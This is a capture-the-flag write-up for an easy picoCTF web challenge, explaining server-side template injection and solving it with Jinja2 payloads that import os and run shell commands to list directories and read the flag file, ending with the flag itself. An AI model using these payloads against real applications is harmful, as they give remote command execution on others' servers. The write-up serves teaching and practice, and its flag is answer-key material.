# SSTI Challenge — picoCTF

**Category:** Web Exploitation  
**Difficulty:** Easy  
**Platform:** picoCTF  

---

## Challenge Description

> I made a cool website where you can announce whatever you want! I heard templating is a cool and modular way to build web apps!

---

## Tools Used

- Browser
- Knowledge of Server-Side Template Injection (SSTI)
- Jinja2 template syntax

---

## Background — What is SSTI?

Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a server-side template without sanitization. If the template engine evaluates the input, an attacker can execute arbitrary code on the server.

**Common template engines:**
| Engine | Language | Test Payload |
|--------|----------|--------------|
| Jinja2 | Python (Flask) | `{{7*7}}` → `49` |
| Twig | PHP | `{{7*7}}` → `49` |
| Freemarker | Java | `${7*7}` → `49` |

---

## Solution

### Step 1 — Test for SSTI

Entered the test payload `{{7*7}}` in the announcement input field.

**Result:** The page displayed `49` instead of `{{7*7}}`.

This confirmed **Jinja2 SSTI** — the server is evaluating our input as a template expression.

### Step 2 — Explore the server

Used Jinja2 template syntax to run OS commands:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
```

**Output:**
```
bin boot challenge dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
```

Found a `challenge` directory — interesting!

### Step 3 — Explore the challenge directory

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls /challenge').read()}}
```

**Output:**
```
__pycache__ app.py flag requirements.txt
```

Found a `flag` file!

### Step 4 — Read the flag

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read()}}
```

**Output:**
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```

---

## Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```

---

## What I Learned

- SSTI is a critical vulnerability that allows remote code execution
- Always test for `{{7*7}}` → `49` to detect Jinja2 SSTI
- Jinja2 allows access to Python's built-in functions through the template context
- This vulnerability has been found in real-world applications including major platforms
- Prevention: never pass raw user input directly to template rendering functions
